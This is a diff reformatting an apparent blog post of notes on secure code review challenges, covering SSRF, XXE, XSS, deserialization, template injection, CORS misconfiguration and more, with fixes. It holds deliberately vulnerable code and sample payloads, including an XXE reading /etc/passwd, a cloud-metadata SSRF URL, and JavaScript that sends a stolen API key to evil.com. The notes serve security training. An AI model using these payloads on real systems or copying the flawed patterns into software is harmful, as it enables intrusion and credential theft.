@@ -1,22 +1,25 @@
 ---
-title: "Code Review Practice - 30 Problems" 
-summary: "Some simple code review challenges" 
-description: "Some simple code review challenges" 
-date: 2025-12-26 
-authors: 
+title: "Code Review Practice - 30 Problems"
+summary: "Some simple code review challenges"
+description: "Some simple code review challenges"
+date: 2025-12-26
+authors:
     - name: dudcom
 group: vulnerability research
 ---
 
 <section>
-## Introduction 
-I was bored during break and wanted go through https://github.com/dub-flow/secure-code-review-challenges for some practice on general code audting honestly was preaty good practice. Just my notes from it, didn't really clean this up much other then asking AI to fix some formating / spelling mistakes so don't bully me to hard.
+    ## Introduction I was bored during break and wanted go through
+    https://github.com/dub-flow/secure-code-review-challenges for some practice
+    on general code audting honestly was preaty good practice. Just my notes
+    from it, didn't really clean this up much other then asking AI to fix some
+    formating / spelling mistakes so don't bully me to hard.
 </section>
 
 <section>
 ## Challenge 1
 
-``` python
+```python
 from flask import Flask, request, redirect, url_for
 import logging
 
@@ -55,9 +58,9 @@ if __name__ == '__main__':
 
 ### Bug 1
 
-  The issue here is that:
+The issue here is that:
 
-``` python
+```python
     redirect_url = request.args.get('redirect_url')
     if redirect_url:
         logging.info(f'Redirecting to: {redirect_url}')
@@ -65,80 +68,78 @@ if __name__ == '__main__':
 ```
 
 - Since an attacker controls the redirect variable, an individual can use this for phishing
-
-  - if we did something like `https://yourapp.com/?redirect_url=https://evil.com/phish`
-    - our code gets redirected here
+    - if we did something like `https://yourapp.com/?redirect_url=https://evil.com/phish`
+        - our code gets redirected here
 
 - Use Flask's `url_for` here
-  - `logging.info(f'Redirecting to: {redirect_url}')`
+    - `logging.info(f'Redirecting to: {redirect_url}')`
 
 - This can be used to perform log injection as well
-
-  - Log is not sanitized even though it takes user controlled data
+    - Log is not sanitized even though it takes user controlled data
 
 - Can input newlines or control characters such as:
-
-  - `?redirect_url=https://evil.com\nINFO User authenticated as admin`
-
+    - `?redirect_url=https://evil.com\nINFO User authenticated as admin`
 
 </section>
 <section>
 ## Challenge 2
 
-``` js
-const express = require('express');
-const axios = require('axios');
+```js
+const express = require("express");
+const axios = require("axios");
 
 const app = express();
 
-app.get('/profile', (req, res) => {
-    console.log('Received request for /profile');
+app.get("/profile", (req, res) => {
+    console.log("Received request for /profile");
 
     // Simulated profile data
     const profileData = {
-        name: 'John Doe',
-        role: 'Developer'
+        name: "John Doe",
+        role: "Developer",
     };
-    
+
     res.json(profileData);
-    console.log('Sent profile data response');
+    console.log("Sent profile data response");
 });
 
-app.get('/fetch-data', async (req, res) => {
+app.get("/fetch-data", async (req, res) => {
     const url = req.query.url;
     console.log(`Received request for /fetch-data with URL: ${url}`);
-    
+
     try {
         const response = await axios.get(url);
         res.send(response.data);
         console.log(`Data fetched and sent for URL: ${url}`);
     } catch (error) {
         console.error(`Error fetching data from URL: ${url}`, error);
-        res.status(500).send('Error fetching data');
+        res.status(500).send("Error fetching data");
     }
 });
 
 app.listen(3000, () => {
-    console.log('Server running on port 3000');
+    console.log("Server running on port 3000");
 });
 ```
 
 ### Bug 1
 
 - The issue here is we are fully generating the code through user input
-  - This allows for server-side request forgery
-  - We have a `get` request that takes in a URL and is then used to fetch data without any validation. Here an attacker could use it to access data they shouldn't be allowed to see
+    - This allows for server-side request forgery
+    - We have a `get` request that takes in a URL and is then used to fetch data without any validation. Here an attacker could use it to access data they shouldn't be allowed to see
 - In order to secure this we should have as little in the control of the user as possible:
 
 ```js
 if (!/^[a-z0-9]+$/i.test(urlParam)) {
-    return res.status(400).send('Invalid URL. Only alphanumeric characters are allowed.');
+    return res
+        .status(400)
+        .send("Invalid URL. Only alphanumeric characters are allowed.");
 }
 const fullUrl = `https://internal-app/${urlParam}`;
 ```
 
 - This prevents access to internal services that a website shouldn't be able to reach
-  - This is a classic SSRF (server side request forgery)
+    - This is a classic SSRF (server side request forgery)
 - For example it could access cloud data and secrets
   `/fetch-data?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 
@@ -146,7 +147,7 @@ const fullUrl = `https://internal-app/${urlParam}`;
 <section>
 ## Challenge 3
 
-``` java
+```java
 @SpringBootApplication
 @RestController
 public class main {
@@ -191,22 +192,23 @@ public class main {
 ### Bug 1
 
 - The primary issue in this code is the use of MD5, it's not cryptographically secure for storing passwords at rest
-  - the next issue here is the fact we are not salting the MD5 so identical password creates MD5 with no salt
-    - All a salt really is a random number generally 10 in length which adds cryptographic soundness and randomness to passwords
+    - the next issue here is the fact we are not salting the MD5 so identical password creates MD5 with no salt
+        - All a salt really is a random number generally 10 in length which adds cryptographic soundness and randomness to passwords
 - The problem here is the fact that MD5 is simply not secure enough for a database, we should be using slow and salted password hashing algorithms such as:
-  - bcrypt
-  - scrypt
-  - Argon2
-  - PBKDF2
+    - bcrypt
+    - scrypt
+    - Argon2
+    - PBKDF2
 
 ### Bug 2
 
-  ``` java
-   @GetMapping({"/admin/usernames"})
-   public Map<String, String> getAllUsernames() {
-      return this.userDatabase;
-   }
-  ```
+```java
+ @GetMapping({"/admin/usernames"})
+ public Map<String, String> getAllUsernames() {
+    return this.userDatabase;
+ }
+```
+
 - The following code here is also insecure since it allows for attackers to leak the entire database by just accessing a single endpoint
 
 ### Bug 3
@@ -218,29 +220,32 @@ public class main {
     ```
 
 - All of the endpoints have no authentication or auth checks
-  - Anyone can use the endpoints to register/go through usernames and dump creds
+    - Anyone can use the endpoints to register/go through usernames and dump creds
+
 ### Bug 4
 
-  ``` java
-  String hashedPassword = this.userDatabase.get(username);
-  return hashedPassword != null && hashedPassword.equals(...)
-  ```
+```java
+String hashedPassword = this.userDatabase.get(username);
+return hashedPassword != null && hashedPassword.equals(...)
+```
+
 - You can side channel if the user exists or not, by using timing differences
+
 ### Bug 5
 
-``` java
+```java
 private Map<String, String> userDatabase = new HashMap();
 ```
 
 - HashMap is not thread-safe and shouldn't be used for long term storage
-  - Multiple writes can corrupt the data
+    - Multiple writes can corrupt the data
 - Note this issue is not as bad in this code base since it's a mobile application and in theory it wouldn't break the code base as much but otherwise
 
 </section>
 <section>
 ## Challenge 4
 
-``` python
+```python
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -274,7 +279,7 @@ if __name__ == '__main__':
 <section>
 ## Challenge 5
 
-``` java
+```java
 @SpringBootApplication
 @RestController
 public class main {
@@ -325,20 +330,20 @@ public class main {
 
 - The bug here is a classic XML External Entity (XXE) vulnerability
 
-``` java
+```java
 DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 DocumentBuilder builder = dbf.newDocumentBuilder();
 Document doc = builder.parse(new InputSource(new StringReader(inputXml)));
 ```
 
 - The attacker controls the XML which allows for including `<!DOCTYPE>`
-  - This allows attackers to read local files
-  - Make network requests
-  - Expand entities recursively
+    - This allows attackers to read local files
+    - Make network requests
+    - Expand entities recursively
 - This is all done server side
   All of this culminates in the ability to perform arbitrary file read:
 
-``` xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE root [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -348,7 +353,7 @@ Document doc = builder.parse(new InputSource(new StringReader(inputXml)));
 
 To secure this we use:
 
-``` java
+```java
 // Prevent XXE attacks
 dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 dbf.setXIncludeAware(false);
@@ -360,7 +365,7 @@ dbf.setXIncludeAware(false);
 <section>
 ## Challenge 6
 
-``` go
+```go
 package main
 
 import (
@@ -399,26 +404,32 @@ func main() {
 
 After which the server will respond with:
 
-``` html
+```html
 <html>
-  <body>
-    <h1>Hello, <script>alert(1)</script>!</h1>
-  </body>
+    <body>
+        <h1>
+            Hello,
+            <script>
+                alert(1);
+            </script>
+            !
+        </h1>
+    </body>
 </html>
 ```
 
 - This will cause the server to actually execute the script, which provides arbitrary JS in the victim's browser under the site's origin which allows for the following:
-  - Session cookie theft
-  - Account takeover
-  - CSRF token exfiltration
-  - DOM manipulation
-  - Phishing overlays
+    - Session cookie theft
+    - Account takeover
+    - CSRF token exfiltration
+    - DOM manipulation
+    - Phishing overlays
 
 </section>
 <section>
 ## Challenge 7
 
-```js
+````js
     const express = require('express');
     const bodyParser = require('body-parser');
 
@@ -483,24 +494,24 @@ server {
     listen 80;
     server_name another-awesome-challenge.com;
 
-    location /backend { 
+    location /backend {
         proxy_pass http://backend/;
     }
-    
+
     location /html {
         alias /usr/share/nginx/html/;
     }
 }
-```
+````
 
 ### Bug 1
 
 - The bug here is the fact that we don't perform any path normalization
-  - Here we are setting the "/html", and if we do something on the lines of
-    `/usr/share/nginx/html/../nginx.conf`
+    - Here we are setting the "/html", and if we do something on the lines of
+      `/usr/share/nginx/html/../nginx.conf`
 - The attack gets a very standard LFI, we can fix this by adding a `/`
 
-``` nginx
+```nginx
 location /html/ {
  root /usr/share/nginx/html;
 }
@@ -508,14 +519,15 @@ location /html/ {
 
 In order to understand why this adds an extra layer of security we need to understand how nginx resolves paths,
 with root it looks like this: `filesystem_path = root + full_request_uri`
+
 - So the request `/html/index.html` will resolve to `/usr/share/nginx/html/html/index.html`
 - Notice the entire URI is appended and the /html/ prefix stays intact
 - The traversal attempts are all contained in the "root" dir
-In comparison alias does the following:
+  In comparison alias does the following:
 - `filesystem_path = alias + (URI minus location prefix)`
 - `/html/index.html` -\> `/usr/share/nginx/html/index.html`
 - `/html/../secret.txt` -\> `/usr/share/nginx/html/../secret.txt`
-Without the extra `/` we are able to perform matches like `/htmlfoo` or `/html../`
+  Without the extra `/` we are able to perform matches like `/htmlfoo` or `/html../`
 
 The security comes from NGINX normalizing the URI before location matching. After normalization, `/html/../secret.txt` becomes `/secret.txt`, which no longer matches `location /html/`, so the request never reaches the `root` directive and is rejected.
 
@@ -523,7 +535,7 @@ The security comes from NGINX normalizing the URI before location matching. Afte
 <section>
 ## Challenge 9
 
-``` python
+```python
 from flask import Flask, request, redirect, url_for
 
 app = Flask(__name__)
@@ -583,7 +595,7 @@ if __name__ == '__main__':
 
 - The bug here is the fact that anyone can edit the "username" variable regardless of whether they are properly logged in or not:
 
-``` python
+```python
 username = request.form.get('username')
 user_profile = user_profile_service.get_user_profile(username)
 
@@ -592,8 +604,8 @@ if user_profile and user_profile.get_username() == username:
 ```
 
 - user_profile.get_username() == username
-  - This validates that the user exists and we are editing the correct db value but doesn't validate that we are allowed to edit the username
-    In order to fix this we have to validate that the person editing the username is in fact the correct user:
+    - This validates that the user exists and we are editing the correct db value but doesn't validate that we are allowed to edit the username
+      In order to fix this we have to validate that the person editing the username is in fact the correct user:
 
 ```python
 def get_logged_in_username():
@@ -619,7 +631,7 @@ def edit_profile():
 <section>
 ## Challenge 10
 
-```js
+````js
     const express = require('express');
     const jwt = require('jsonwebtoken');
     require('dotenv').config();
@@ -691,7 +703,7 @@ app.run(host='0.0.0.0', port=5000)
 
 ```nginx
 events {
-        worker_connections 1024; 
+        worker_connections 1024;
     }
 
     http {
@@ -719,7 +731,7 @@ The bug here is the difference between parsers, in this case nginx allows charac
 location ~* ^/admin {
     deny all;
 }
-```
+````
 
 - The fix here is to use a proper case-insensitive checks to ensure proper security of nginx
 
@@ -727,7 +739,7 @@ location ~* ^/admin {
 <section>
 ## Challenge 12
 
-``` python
+```python
 from flask import Flask, request, jsonify
 import subprocess
 
@@ -759,7 +771,7 @@ if __name__ == '__main__':
     app.run(debug=False)
 ```
 
-``` bash
+```bash
 #!/bin/bash
 
 SECURE_PASSWORD="SuperAdmin@123"
@@ -773,15 +785,17 @@ fi
 
 ### Bug 1
 
-``` bash
+```bash
 if [[ $SECURE_PASSWORD == $1 ]]; then
 ```
 
 The bug here is actually kinda interesting and is a language native bug related to bash, the TLDR is because our comparison doesn't use quotes we end up allowing the user input of `*` to actually pass and work as a good password. Furthermore it's also possible to leak the password here by brute forcing and checking to see if `X-kth*` passes. If the Xkth value passes then we know it's in the password/secret
+
 ### Bug 2
+
 While not directly exploitable the way input is being processed is a bad idea, if any user or threat actor somehow had access to the process information/audit logs for the running server it would be possible to see the plaintext password attempts. As such it's better to use stdin instead of commandline args:
 
-``` python
+```python
 subprocess.run(
     ['./validate_password.sh'],
     input=password,
@@ -792,14 +806,14 @@ subprocess.run(
 
 ### Bug 3
 
-``` bash
+```bash
 if [[ $SECURE_PASSWORD == $1 ]]; then
 ```
 
 - This is also side channelable
   Easiest fix to code being is using some kind of hash for validation through ensuring matching hashes so it's constant time
 
-``` bash
+```bash
 printf '%s' "$SECURE_PASSWORD" | \
   openssl dgst -sha256 | \
   diff - <(printf '%s' "$INPUT_PASSWORD" | openssl dgst -sha256) >/dev/null
@@ -809,7 +823,7 @@ printf '%s' "$SECURE_PASSWORD" | \
 <section>
 ## Challenge 13
 
-``` java
+```java
 package com.example.demo;
 
 import org.springframework.beans.factory.annotation.Value;
@@ -854,106 +868,166 @@ class UserController {
 <section>
 ## Challenge 14
 
-``` js
-const express = require('express');
-const bodyParser = require('body-parser');
-const sqlite3 = require('sqlite3').verbose();
+```js
+const express = require("express");
+const bodyParser = require("body-parser");
+const sqlite3 = require("sqlite3").verbose();
 
 const app = express();
 app.use(bodyParser.json());
 
-const db = new sqlite3.Database('/data/database.db');
+const db = new sqlite3.Database("/data/database.db");
 db.serialize(() => {
-  db.run("CREATE TABLE IF NOT EXISTS accounts (id INT PRIMARY KEY, balance INT)");
-  db.run("INSERT OR IGNORE INTO accounts (id, balance) VALUES (1, 1000)");
-  db.run("INSERT OR IGNORE INTO accounts (id, balance) VALUES (2, 1000)");
+    db.run(
+        "CREATE TABLE IF NOT EXISTS accounts (id INT PRIMARY KEY, balance INT)",
+    );
+    db.run("INSERT OR IGNORE INTO accounts (id, balance) VALUES (1, 1000)");
+    db.run("INSERT OR IGNORE INTO accounts (id, balance) VALUES (2, 1000)");
 });
 
-app.post('/transfer', (req, res) => {
-  const { from, to, amount } = req.body;
+app.post("/transfer", (req, res) => {
+    const { from, to, amount } = req.body;
 
-  if (typeof from !== 'number' || typeof to !== 'number' || typeof amount !== 'number' || amount <= 0) {
-    return res.status(400).json({ message: 'Invalid input' });
-  }
-  
-  db.get("SELECT balance FROM accounts WHERE id = ?", [from], (err, row) => {
-    if (!row) return res.status(400).json({ message: 'Invalid from account' });
+    if (
+        typeof from !== "number" ||
+        typeof to !== "number" ||
+        typeof amount !== "number" ||
+        amount <= 0
+    ) {
+        return res.status(400).json({ message: "Invalid input" });
+    }
 
-    if (row.balance < amount) return res.status(400).json({ message: 'Insufficient funds' });
+    db.get("SELECT balance FROM accounts WHERE id = ?", [from], (err, row) => {
+        if (!row)
+            return res.status(400).json({ message: "Invalid from account" });
 
-    db.run("UPDATE accounts SET balance = balance - ? WHERE id = ?", [amount, from], (err) => {      
-      db.run("UPDATE accounts SET balance = balance + ? WHERE id = ?", [amount, to], (err) => {        
-        res.status(200).json({ message: 'Transfer successful' });
-      });
+        if (row.balance < amount)
+            return res.status(400).json({ message: "Insufficient funds" });
+
+        db.run(
+            "UPDATE accounts SET balance = balance - ? WHERE id = ?",
+            [amount, from],
+            (err) => {
+                db.run(
+                    "UPDATE accounts SET balance = balance + ? WHERE id = ?",
+                    [amount, to],
+                    (err) => {
+                        res.status(200).json({
+                            message: "Transfer successful",
+                        });
+                    },
+                );
+            },
+        );
     });
-  });
 });
 
-app.get('/balance/:id', (req, res) => {
-  db.get("SELECT balance FROM accounts WHERE id = ?", [req.params.id], (err, row) => {
-    if (!row) return res.status(400).json({ message: 'Invalid account' });
+app.get("/balance/:id", (req, res) => {
+    db.get(
+        "SELECT balance FROM accounts WHERE id = ?",
+        [req.params.id],
+        (err, row) => {
+            if (!row)
+                return res.status(400).json({ message: "Invalid account" });
 
-    res.status(200).json({ balance: row.balance });
-  });
+            res.status(200).json({ balance: row.balance });
+        },
+    );
 });
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+app.listen(3000, () => console.log("Server running on port 3000"));
 ```
 
 ### Bug 1
 
 The code has a logic bug in the form of a race condition/TOCTOU, which is caused by cases when a transfer is placed and something were to happen either from a speed standpoint or the server going down which could cause the funds to have been improperly moved. The fix to this situation is to introduce a rollback and state system where we ensure all behavior takes place before we commit the changes:
 
-``` js
-app.post('/transfer', (req, res) => {
-  const { from, to, amount } = req.body;
+```js
+app.post("/transfer", (req, res) => {
+    const { from, to, amount } = req.body;
 
-  if (typeof from !== 'number' || typeof to !== 'number' || typeof amount !== 'number' || amount <= 0) {
-    return res.status(400).json({ message: 'Invalid input' });
-  }
+    if (
+        typeof from !== "number" ||
+        typeof to !== "number" ||
+        typeof amount !== "number" ||
+        amount <= 0
+    ) {
+        return res.status(400).json({ message: "Invalid input" });
+    }
 
-  db.serialize(() => {
-    db.run("BEGIN EXCLUSIVE TRANSACTION", (err) => {
-      if (err) {
-        return res.status(500).json({ message: 'Failed to start transaction' });
-      }
-      
-      db.get("SELECT balance FROM accounts WHERE id = ?", [from], (err, row) => {
-        if (err || !row) {
-          db.run("ROLLBACK");
-          return res.status(400).json({ message: 'Invalid from account' });
-        }
-
-        if (row.balance < amount) {
-          db.run("ROLLBACK");
-          return res.status(400).json({ message: 'Insufficient funds' });
-        }
-
-        db.run("UPDATE accounts SET balance = balance - ? WHERE id = ?", [amount, from], (err) => {
-          if (err) {
-            db.run("ROLLBACK");
-            return res.status(500).json({ message: 'Database error' });
-          }
-
-          db.run("UPDATE accounts SET balance = balance + ? WHERE id = ?", [amount, to], (err) => {
+    db.serialize(() => {
+        db.run("BEGIN EXCLUSIVE TRANSACTION", (err) => {
             if (err) {
-              db.run("ROLLBACK");
-              return res.status(500).json({ message: 'Database error' });
+                return res
+                    .status(500)
+                    .json({ message: "Failed to start transaction" });
             }
 
-            db.run("COMMIT", (err) => {
-              if (err) {
-                db.run("ROLLBACK");
-                return res.status(500).json({ message: 'Failed to commit transaction' });
-              }
+            db.get(
+                "SELECT balance FROM accounts WHERE id = ?",
+                [from],
+                (err, row) => {
+                    if (err || !row) {
+                        db.run("ROLLBACK");
+                        return res
+                            .status(400)
+                            .json({ message: "Invalid from account" });
+                    }
 
-              res.status(200).json({ message: 'Transfer successful' });
-            });
-          });
+                    if (row.balance < amount) {
+                        db.run("ROLLBACK");
+                        return res
+                            .status(400)
+                            .json({ message: "Insufficient funds" });
+                    }
+
+                    db.run(
+                        "UPDATE accounts SET balance = balance - ? WHERE id = ?",
+                        [amount, from],
+                        (err) => {
+                            if (err) {
+                                db.run("ROLLBACK");
+                                return res
+                                    .status(500)
+                                    .json({ message: "Database error" });
+                            }
+
+                            db.run(
+                                "UPDATE accounts SET balance = balance + ? WHERE id = ?",
+                                [amount, to],
+                                (err) => {
+                                    if (err) {
+                                        db.run("ROLLBACK");
+                                        return res
+                                            .status(500)
+                                            .json({
+                                                message: "Database error",
+                                            });
+                                    }
+
+                                    db.run("COMMIT", (err) => {
+                                        if (err) {
+                                            db.run("ROLLBACK");
+                                            return res
+                                                .status(500)
+                                                .json({
+                                                    message:
+                                                        "Failed to commit transaction",
+                                                });
+                                        }
+
+                                        res.status(200).json({
+                                            message: "Transfer successful",
+                                        });
+                                    });
+                                },
+                            );
+                        },
+                    );
+                },
+            );
         });
-      });
     });
-  });
 });
 ```
 
@@ -961,9 +1035,9 @@ app.post('/transfer', (req, res) => {
 <section>
 ## Challenge 15
 
-``` nginx
+```nginx
 events {
-    worker_connections 1024; 
+    worker_connections 1024;
 }
 
 http {
@@ -996,7 +1070,7 @@ location /safe {
 <section>
 ## Challenge 16
 
-``` java
+```java
 @WebServlet("/upload")
 @MultipartConfig
 public class FileUploadServlet extends HttpServlet {
@@ -1009,7 +1083,7 @@ public class FileUploadServlet extends HttpServlet {
 
         Part filePart = request.getPart("file");
         String fileName = filePart.getSubmittedFileName();
- 
+
         if (fileName.toLowerCase().endsWith(".jsp")) {
             response.setContentType("text/html");
             PrintWriter out = response.getWriter();
@@ -1022,7 +1096,7 @@ public class FileUploadServlet extends HttpServlet {
         if (!uploadDirFile.exists()) {
             uploadDirFile.mkdir();
         }
-        
+
         File file = new File(uploadDir, fileName);
         try (InputStream fileContent = filePart.getInputStream();
             FileOutputStream outputStream = new FileOutputStream(file)) {
@@ -1032,7 +1106,7 @@ public class FileUploadServlet extends HttpServlet {
                 outputStream.write(buffer, 0, bytesRead);
             }
         }
-        
+
         response.setContentType("text/html");
         PrintWriter out = response.getWriter();
         out.println("<html><body><h2>File Uploaded Successfully</h2>");
@@ -1045,6 +1119,7 @@ public class FileUploadServlet extends HttpServlet {
 ### Bug 1
 
 `if (fileName.toLowerCase().endsWith(".jsp")) {`
+
 - This is very easily bypassed by the code and allows for attackers to trivially enter something like `exploit.jsp.png`
 
 ### Bug 2
@@ -1062,9 +1137,10 @@ public class FileUploadServlet extends HttpServlet {
 ### Bug 5
 
 `out.println("<p>File Name: " + fileName + "</p>");`
+
 - This is a stored XSS bug which will execute for any user viewing the success page
 
-``` java
+```java
 @WebServlet("/upload")
 @MultipartConfig(
     maxFileSize = 2 * 1024 * 1024,        // 2 MB
@@ -1129,7 +1205,7 @@ public class SecureFileUploadServlet extends HttpServlet {
 <section>
 ## Challenge 17
 
-``` go
+```go
 package main
 
 import (
@@ -1175,19 +1251,19 @@ func main() {
 <section>
 ## Challenge 18
 
-``` php
+```php
 <?php
 session_start();
 
 class User {
     public $username;
     public $role;
-    
+
     public function __construct($username, $role) {
         $this->username = $username;
         $this->role = $role;
     }
-    
+
     public function __toString() {
         return "User: $this->username, Role: $this->role";
     }
@@ -1234,10 +1310,11 @@ if (isAdmin()) {
 ### Bug 1
 
 The bug here is a PHP object injection / unsafe deserialization exploit
-- Allows for auth bypass
-The code lies in the line `$user = @unserialize($data);` which unserializes untrusted user input. This allows users to create arbitrary property values. In our case this breaks the auth since:
 
-``` php
+- Allows for auth bypass
+  The code lies in the line `$user = @unserialize($data);` which unserializes untrusted user input. This allows users to create arbitrary property values. In our case this breaks the auth since:
+
+```php
 function isAdmin() {
     if (isset($_SESSION['user']) && $_SESSION['user'] instanceof User) {
         return $_SESSION['user']->role === 'admin';
@@ -1256,13 +1333,14 @@ Here the code ends up being bad since we can set the user role to `admin`
 ### Bug 2
 
 `echo 'Hello ' . $_SESSION['user'];`
+
 - This is a stored XSS bug
 
 </section>
 <section>
 ## Challenge 19
 
-``` go
+```go
 package main
 
 import (
@@ -1314,20 +1392,20 @@ func main() {
 
 The bug here is a server-side template injection, if we look at the following code:
 
-``` go
-tmpl := r.URL.Query().Get("tmpl") // attacker provided template 
+```go
+tmpl := r.URL.Query().Get("tmpl") // attacker provided template
 t, err := template.New("page").Funcs(funcs).Parse(tmpl)
 t.Execute(w, user)
 ```
 
 - The full template comes from a query parameter, which gets executed server-side
-  - On top of that we expose the function `ReadUserFile` and runs as user which allows for more or less arbitrary code execution
+    - On top of that we expose the function `ReadUserFile` and runs as user which allows for more or less arbitrary code execution
 - The `html/template` escapes the HTML and prevents against XSS but not template injection, it will auto-escape output but still fully evaluates
-  - function calls
-  - pipelines
-  - control structures
-  - method access
-    To make it safe we do the following:
+    - function calls
+    - pipelines
+    - control structures
+    - method access
+      To make it safe we do the following:
 
 ```go
 type TemplateData struct {
@@ -1358,13 +1436,11 @@ func handler(w http.ResponseWriter, r *http.Request) {
 }
 ```
 
-
-
 </section>
 <section>
 ## Challenge 20
 
-```java
+````java
     @RestController
     @RequestMapping("/files")
     public class FileController {
@@ -1412,26 +1488,27 @@ The bug here is file path traversal since user controls input and there is no va
 public ResponseEntity<Resource> downloadFile(@RequestParam String filename) throws IOException {
 
 Path filePath = Paths.get(fileBasePath + filename);
-```
+````
 
 To fix this security bug we can do the two following things:
+
 1. The name should be validated alphanumeric, while the filetype/extension with an allow list
 2. Canonicalize the result so we are sure we are in the base path
 
     File file = new File(fileBasePath + filename);  
-    String absolutePath = file.getCanonicalPath();  
+    String absolutePath = file.getCanonicalPath();
 
     if (!absolutePath.startsWith(fileBasePath)) {  
-        // throw an exception and don't process the file  
+     // throw an exception and don't process the file  
     }
 
 </section>
 <section>
 ## Challenge 21
 
-``` js
-const express = require('express');
-const cookieParser = require('cookie-parser');
+```js
+const express = require("express");
+const cookieParser = require("cookie-parser");
 const app = express();
 const PORT = 3000;
 
@@ -1439,35 +1516,39 @@ app.use(cookieParser());
 
 // For the sake of the challenge, imagine this comes from a database instead of being hardcoded
 const users = {
-  admin: {
-    username: 'admin',
-    apiKey: '<some-secret-API-key>'
-  }
+    admin: {
+        username: "admin",
+        apiKey: "<some-secret-API-key>",
+    },
 };
 
 app.use((req, res, next) => {
-    const origin = req.get('Origin');
+    const origin = req.get("Origin");
     if (origin) {
-        res.header('Access-Control-Allow-Origin', origin); 
-        res.header('Access-Control-Allow-Credentials', 'true'); 
+        res.header("Access-Control-Allow-Origin", origin);
+        res.header("Access-Control-Allow-Credentials", "true");
     }
     next();
 });
 
 // Imagine this is a fully grown login
-app.get('/mock-login', (req, res) => {
-    res.cookie('auth', users.admin.username, { httpOnly: true, secure: true, sameSite: "none"});
-    return res.status(200).json({ message: 'Login successful!' });;
+app.get("/mock-login", (req, res) => {
+    res.cookie("auth", users.admin.username, {
+        httpOnly: true,
+        secure: true,
+        sameSite: "none",
+    });
+    return res.status(200).json({ message: "Login successful!" });
 });
 
-app.get('/api-key', (req, res) => {
+app.get("/api-key", (req, res) => {
     const username = req.cookies.auth;
 
     if (username && users[username]) {
         return res.status(200).json({ data: users[username].apiKey });
     }
 
-    return res.status(403).json({ message: 'Unauthorized access!' });
+    return res.status(403).json({ message: "Unauthorized access!" });
 });
 
 app.listen(PORT, () => {
@@ -1478,22 +1559,25 @@ app.listen(PORT, () => {
 ### Bug 1
 
 This bug relates to the `Origin` header, since it's fully controlled by the client that means an attacker can also use it. After that the code breaks the trust system defined by Cross-Origin Resource Sharing - CORS. The problem that exists is we are allowing both
+
 - Reflected the user controlled Origin header
 - Allowing credentials cookies to be valid in the reflected site
 - No validation that origin requesting the data is secure or safe
-These two headers combined allow sending authentication cookies cross-origin and allow JS on the attackers site to read the response body.
+  These two headers combined allow sending authentication cookies cross-origin and allow JS on the attackers site to read the response body.
 
 This was a bit confusing to me so let me break it down, the first assumption we need to make is we have logged in admin account. If our logged in admin visits the attacker website and which does the following:
 
-``` js
+```js
 fetch("http://localhost:3000/api-key", {
-  credentials: "include"
+    credentials: "include",
 })
-.then(r => r.json())
-.then(d => fetch("https://evil.com/steal", {
-  method: "POST",
-  body: JSON.stringify(d)
-}));
+    .then((r) => r.json())
+    .then((d) =>
+        fetch("https://evil.com/steal", {
+            method: "POST",
+            body: JSON.stringify(d),
+        }),
+    );
 ```
 
 The browser will see the following request:
@@ -1508,9 +1592,9 @@ For which the server will respond with the following:
 
 Allowing the JS in the attackers website to read the following:
 
-``` json
+```json
 {
-  "data": "<some-secret-API-key>"
+    "data": "<some-secret-API-key>"
 }
 ```
 
@@ -1518,45 +1602,47 @@ Allowing the JS in the attackers website to read the following:
 <section>
 ## Challenge 22
 
-``` js
-const express = require('express');
+```js
+const express = require("express");
 const app = express();
 
 // Imagine this to be a fully-grown database
 const mockDb = {
     users: [
-        { username: 'admin', password: 'admin123' },
-        { username: 'user1', password: 'password1' },
+        { username: "admin", password: "admin123" },
+        { username: "user1", password: "password1" },
     ],
 };
 
 app.use(express.json());
 
-app.post('/login', (req, res) => {
+app.post("/login", (req, res) => {
     const { username, password } = req.body;
 
-    const user = mockDb.users.find(u => u.username === username && u.password === password);
+    const user = mockDb.users.find(
+        (u) => u.username === username && u.password === password,
+    );
 
     if (user) {
-        res.send({ message: 'Login successful!' });
+        res.send({ message: "Login successful!" });
     } else {
-        res.status(401).send({ error: 'Invalid credentials' });
+        res.status(401).send({ error: "Invalid credentials" });
     }
 });
 
-app.post('/process-data', (req, res) => {
+app.post("/process-data", (req, res) => {
     const { data } = req.body;
 
     try {
-        const result = eval(data); 
+        const result = eval(data);
         res.send({ result });
     } catch (err) {
-        res.status(400).send({ error: 'Invalid data' });
+        res.status(400).send({ error: "Invalid data" });
     }
 });
 
 app.listen(3000, () => {
-    console.log('Server running on http://localhost:3000');
+    console.log("Server running on http://localhost:3000");
 });
 ```
 
@@ -1568,7 +1654,7 @@ app.listen(3000, () => {
 <section>
 ## Challenge 23
 
-``` java
+```java
 package com.example.demoapp;
 
 import org.springframework.web.bind.annotation.*;
@@ -1608,7 +1694,7 @@ The exploit here is the fact that the GET request `/custom-hello` takes in the `
 <section>
 ## Challenge 24
 
-``` python
+```python
 from flask import Flask, request, render_template
 from saxonche import PySaxonProcessor
 
@@ -1623,7 +1709,7 @@ def parse_xslt():
     try:
         if 'xslt_file' not in request.files:
             return 'No file part', 400
-        
+
         xslt_file = request.files['xslt_file']
         xslt_content = xslt_file.read()
 
@@ -1645,7 +1731,7 @@ def parse_xslt():
     except Exception as e:
         print(f"Error processing XSLT: {str(e)}")
         return str(e), 500
-    
+
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0')
 ```
@@ -1654,7 +1740,7 @@ if __name__ == '__main__':
 
 The exploit here is an XSLT based injection, in the code we are allowing users to provide untrusted and unvalidated XSLT that gets compiled and executed on the server with XML/XSLT engine. Here is an example of an exploit:
 
-``` xml
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE dtd_sample>
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
@@ -1668,7 +1754,7 @@ The exploit here is an XSLT based injection, in the code we are allowing users t
 <section>
 ## Challenge 25
 
-``` go
+```go
 package main
 
 import (
@@ -1732,7 +1818,7 @@ func main() {
 
 The bug is a NoSQL injection / MongoDB operator injection that leads to an auth bypass
 
-``` go
+```go
 var creds map[string]interface{}
 json.NewDecoder(r.Body).Decode(&creds)
 
@@ -1743,8 +1829,8 @@ if users.FindOne(context.TODO(), creds).Err() != nil {
 ```
 
 - The user input is decoded into a generic `map[string]interface{}`
